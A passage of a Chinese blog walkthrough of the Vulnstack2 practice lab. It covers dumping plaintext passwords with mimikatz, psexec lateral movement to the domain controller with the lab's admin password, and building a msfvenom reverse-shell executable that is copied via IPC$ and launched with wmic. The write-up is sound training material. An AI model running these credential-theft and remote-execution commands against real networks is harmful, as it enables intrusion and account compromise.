+	srcset="/shentou/vulnstack/vulnstack2/1726407489451-15f50719-2371-4e65-bd63-b5249b4b3eb7_hu42305b496a442c08a96d1873e73e9efc_43160_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726407489451-15f50719-2371-4e65-bd63-b5249b4b3eb7_hu42305b496a442c08a96d1873e73e9efc_43160_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="470"
+		data-flex-basis="1128px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726407600063-142f7bde-fb8d-49e9-9a59-8224937a2ae3.png"
+	width="607"
+	height="155"
+	srcset="/shentou/vulnstack/vulnstack2/1726407600063-142f7bde-fb8d-49e9-9a59-8224937a2ae3_hua9348911737b40efee4021f6787dac32_50563_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726407600063-142f7bde-fb8d-49e9-9a59-8224937a2ae3_hua9348911737b40efee4021f6787dac32_50563_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="391"
+		data-flex-basis="939px"
+	
+></p>
+<p><code>10.10.10.10</code>是域控,<code>10.10.10.80</code>是WEB,<code>255和254</code>是广播,所以<code>10.10.10.128</code>是另一个域成员PC的</p>
+<h3 id="获取明文密码">获取明文密码
+</h3><p>退回<code>meterpreter</code>加载mimikatz获取明文密码</p>
+<p><code>load kiwi</code></p>
+<p><code>creds_all</code></p>
+<h2 id="横向移动">横向移动
+</h2><h3 id="dc">DC
+</h3><p><img src="/shentou/vulnstack/vulnstack2/1726408149843-16a39773-4f51-4074-8e29-c28c62f95f1f.png"
+	width="850"
+	height="534"
+	srcset="/shentou/vulnstack/vulnstack2/1726408149843-16a39773-4f51-4074-8e29-c28c62f95f1f_hue45f76d7cacf907fe2a121570719f8df_161492_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726408149843-16a39773-4f51-4074-8e29-c28c62f95f1f_hue45f76d7cacf907fe2a121570719f8df_161492_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="159"
+		data-flex-basis="382px"
+	
+></p>
+<p>通过psexec横向移动</p>
+<p>在上面通过kiwi获得域管理员的密码账号</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">background</span> <span class="c1">#退回session，进入msf中</span>
+</span></span><span class="line"><span class="cl"><span class="n">route</span> <span class="n">add</span> <span class="mf">10.10.10.0</span> <span class="mf">255.255.255.0</span> <span class="n">session_id</span> <span class="c1">#在msf中设置路由访问内网</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span> <span class="c1">#使用psexec</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span> <span class="c1">#创建连接</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">rhost</span> <span class="n">ip</span> <span class="c1">#设置DC机ip</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">SMBUser</span> <span class="n">administrator</span> <span class="c1">#设置域管理员账户</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">SMBPass</span> <span class="mi">1</span><span class="n">qaz</span><span class="nd">@WSX</span> <span class="c1">#设置密码</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/shentou/vulnstack/vulnstack2/1726408978122-eddb6509-6582-4b7f-9f1c-d651ad987d09.png"
+	width="869"
+	height="528"
+	srcset="/shentou/vulnstack/vulnstack2/1726408978122-eddb6509-6582-4b7f-9f1c-d651ad987d09_hu8451e7de7b4ef82040d4f9fc5a8bc0ca_224312_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726408978122-eddb6509-6582-4b7f-9f1c-d651ad987d09_hu8451e7de7b4ef82040d4f9fc5a8bc0ca_224312_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="395px"
+	
+><img src="/shentou/vulnstack/vulnstack2/1726409014263-19880c3c-9021-40df-ad6e-3716feb9a4a8.png"
+	width="283"
+	height="96"
+	srcset="/shentou/vulnstack/vulnstack2/1726409014263-19880c3c-9021-40df-ad6e-3716feb9a4a8_huf38ae2e3ec3fb2ce4c9a49057bdc498a_7994_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726409014263-19880c3c-9021-40df-ad6e-3716feb9a4a8_huf38ae2e3ec3fb2ce4c9a49057bdc498a_7994_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="294"
+		data-flex-basis="707px"
+	
+></p>
+<p>拿下域控DC机</p>
+<h3 id="pc">PC
+</h3><p><strong><font style="color:rgb(34, 34, 34);">生成木马：</font></strong></p>
+<p><code>sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.211.147 lport=8899 -f exe -o shell3.exe</code></p>
+<p><strong><font style="color:rgb(34, 34, 34);">开启$IPC:</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">WEB机：
+</span></span><span class="line"><span class="cl">net use \\10.10.10.128\ipc$ &#34;1qaz@WSX&#34; /user:administrator@de1ay.com
+</span></span><span class="line"><span class="cl">copy shell3.exe \\10.10.10.128\c$
+</span></span><span class="line"><span class="cl">dir \\10.10.10.128\c$
+</span></span><span class="line"><span class="cl">这里是开网络共享将shell.exe传到PC机的C盘下
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">域控机：
+</span></span><span class="line"><span class="cl">wmic /node:10.10.10.128 /user:administrator@de1ay.com /password:1qaz@WSX process call create &#34;C:\shell3.exe&#34;
+</span></span><span class="line"><span class="cl">wmic：Windows Management Instrumentation Command-line，允许你通过命令行访问和管理系统管理信息。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/node:10.10.10.128：指定要操作的远程计算机的 IP 地址。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/user:administrator@de1ay.com：指定用于登录到远程计算机的用户名。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/password:1qaz@WSX：指定用于登录的密码。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">process call create &#34;C:\shell3.exe&#34;：在远程计算机上创建并运行 C:\shell3.exe 进程。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/shentou/vulnstack/vulnstack2/1726409658453-7c98ccd1-a5fd-4bab-8590-0deb81f6d7a2.png"
+	width="760"
+	height="195"
+	srcset="/shentou/vulnstack/vulnstack2/1726409658453-7c98ccd1-a5fd-4bab-8590-0deb81f6d7a2_hu97f935a52cdbf84752fbc5149bc6b1d9_69433_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726409658453-7c98ccd1-a5fd-4bab-8590-0deb81f6d7a2_hu97f935a52cdbf84752fbc5149bc6b1d9_69433_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="389"
+		data-flex-basis="935px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726411631348-a59b39a4-e1ce-42f6-91e3-c16ff7cb6ccc.png"
+	width="515"
+	height="348"
+	srcset="/shentou/vulnstack/vulnstack2/1726411631348-a59b39a4-e1ce-42f6-91e3-c16ff7cb6ccc_huca67d03ba191304ad516cd156ae4e12b_80775_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726411631348-a59b39a4-e1ce-42f6-91e3-c16ff7cb6ccc_huca67d03ba191304ad516cd156ae4e12b_80775_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="355px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726411647234-e9cd33f6-e4f7-47da-8934-d6d4395048be.png"
+	width="867"
+	height="229"
+	srcset="/shentou/vulnstack/vulnstack2/1726411647234-e9cd33f6-e4f7-47da-8934-d6d4395048be_hu0099f518254d6695dd62fbf985b0a92f_70346_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726411647234-e9cd33f6-e4f7-47da-8934-d6d4395048be_hu0099f518254d6695dd62fbf985b0a92f_70346_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="378"
+		data-flex-basis="908px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726411658387-e85856ad-3bba-425f-b3e5-9498e0730bc3.png"
+	width="512"
+	height="252"
+	srcset="/shentou/vulnstack/vulnstack2/1726411658387-e85856ad-3bba-425f-b3e5-9498e0730bc3_hu3ddbb5aecad1fbf488e29eea449dfc22_21223_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726411658387-e85856ad-3bba-425f-b3e5-9498e0730bc3_hu3ddbb5aecad1fbf488e29eea449dfc22_21223_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="203"
+		data-flex-basis="487px"
+	
+></p>
+<p>能看到shell是上去了,但是一直连不上,不知道啥问题</p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726411675190-b1e9f17f-8b77-4455-99c2-6a0797ea9641.png"
+	width="571"
+	height="250"
+	srcset="/shentou/vulnstack/vulnstack2/1726411675190-b1e9f17f-8b77-4455-99c2-6a0797ea9641_hu40941a51336b532d6e79b3343df8bd46_69059_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726411675190-b1e9f17f-8b77-4455-99c2-6a0797ea9641_hu40941a51336b532d6e79b3343df8bd46_69059_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="548px"
+	
+></p>
+<p>nmap扫到了3389端口</p>
+<p>有账号密码可以远程连接</p>
+<p><code>de1ay:1qaz@WSX</code></p>
+<p><img src="/shentou/vulnstack/vulnstack2/1726469254950-8019d0b1-563f-4b0c-9af4-dbc978b8cce4.png"
+	width="779"
+	height="588"
+	srcset="/shentou/vulnstack/vulnstack2/1726469254950-8019d0b1-563f-4b0c-9af4-dbc978b8cce4_hue5b69293b956dbe23543af274e7e0fe2_64509_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack2/1726469254950-8019d0b1-563f-4b0c-9af4-dbc978b8cce4_hue5b69293b956dbe23543af274e7e0fe2_64509_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="317px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Mar 03, 2025 15:27 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/shentou/vulnstack/vulnstack1/">
+        
+        
+            <div class="article-image">
+                <img src="/shentou/vulnstack/vulnstack1/14.3971f7e2933608fe0f70840dc5fe6046_hue438cfe9143abe931df507258b8df3ff_261430_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Vulnstack1"
+                        
+                        data-hash="md5-OXH34pM2CP4PcIQNxf5gRg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Vulnstack1</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/shentou/vulnhub/w1e3s/">
+        
+        
+            <div class="article-image">
+                <img src="/shentou/vulnhub/w1e3s/13.77123a0ce38008492538c1bc99b49322_hu5b08183bff39717ce68447d69c09704d_736555_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post W1e3s"
+                        
+                        data-hash="md5-dxI6DOOACEklOMG8mbSTIg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">W1e3s</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/shentou/vulnhub/vulnix/">
+        
+        
+            <div class="article-image">
+                <img src="/shentou/vulnhub/vulnix/12.f1ce5bf1f8047340847989621ce88075_hu5edc2dee25930f45c5f3558e9b5d8e2d_471588_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Vulnix"
+                        
+                        data-hash="md5-8c5b8fgEc0CEeYliHOiAdQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Vulnix</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/shentou/vulnhub/tr0ll/">
+        
+        
+            <div class="article-image">
+                <img src="/shentou/vulnhub/tr0ll/11.fa5687c30ba60a30dcf48db65f9ce7de_hu55c6e0bf4da1ddb34f779c438d682c63_464230_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Tr0ll"
+                        
+                        data-hash="md5-&#43;laHwwumCjDc9I22X5zn3g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Tr0ll</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/shentou/vulnhub/raven/">
+        
+        
+            <div class="article-image">
+                <img src="/shentou/vulnhub/raven/10.cdd7da0c250b77825d94fa2147947414_huc584c10ae1fdf6b10c758655cf22572c_334424_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Raven"
+                        
+                        data-hash="md5-zdfaDCULd4JdlPohR5R0FA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Raven</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 一个俗人
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+  @font-face {
+    font-family: '屏显臻宋';
+    src: url(https://gsygsr.github.io/font/%E5%B1%8F%E6%98%BE%E8%87%BB%E5%AE%8B.ttf) format('truetype');
+  }
+
+  :root {
+    --base-font-family: '屏显臻宋';
+    --code-font-family: '屏显臻宋';
+  }
+  body {
+    background: url(https://gsygsr.github.io/background/58.jpg) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+    </body>
+</html>
